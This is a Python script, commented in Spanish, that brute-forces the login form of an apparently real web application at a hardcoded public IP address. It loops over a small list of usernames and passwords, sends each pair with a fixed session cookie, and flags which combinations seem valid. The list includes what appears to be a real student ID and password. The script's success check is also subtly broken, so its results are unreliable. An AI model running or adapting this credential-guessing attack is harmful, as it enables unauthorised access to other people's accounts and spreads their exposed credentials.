import sys
import requests
from termcolor import colored, cprint

# Cookie de autenticación (asegúrate de que esta cookie sea válida para tu entorno)
cookie = {
    "PHPSESSID": "q88d6p0330k5u5fs9ogbemc27a"
}

# Lista de usuarios y contraseñas directamente en el código
usuarios = ["20060001", "user1", "guest"]
contrasenas = ["Ivanna0709", "password", "admin123"]

# Bucle para probar combinaciones de usuario y contraseña
for usuario in usuarios:
    for contrasena in contrasenas:
        url = "http://35.222.177.84/sigea/index.php"
        data = {
            "login": usuario,
            "password": contrasena
        }

        # Realizamos la solicitud POST al sitio con las cookies de sesión
        response = requests.post(url, data=data, cookies=cookie)

        # Verificamos si la solicitud fue redirigida
        if response.history:
            cprint(f"[!] Redirección detectada para {usuario}:{contrasena}.", "yellow", attrs=["bold"], file=sys.stderr)
        
        # Imprimir el código de estado HTTP
        cprint(f"[INFO] Código de estado: {response.status_code} para {usuario}:{contrasena}.", "blue", attrs=["bold"], file=sys.stderr)
        
        # Imprimir la respuesta para inspeccionar posibles errores
        print(response.text[:500])  # Solo los primeros 500 caracteres del HTML para no sobrecargar la salida

        # Verificamos si la respuesta contiene el mensaje de error o éxito
        # Cambia este mensaje por el que corresponda al sitio web en caso de que no sea el mismo
        if "El usuario no existe." "El password no es correcto" not in response.text:
            cprint(f"[+] {usuario}:{contrasena} es válido", "green", attrs=["bold"], file=sys.stderr)
        else:
            cprint(f"[-] {usuario}:{contrasena} no es válido", "red", attrs=["bold"], file=sys.stderr)
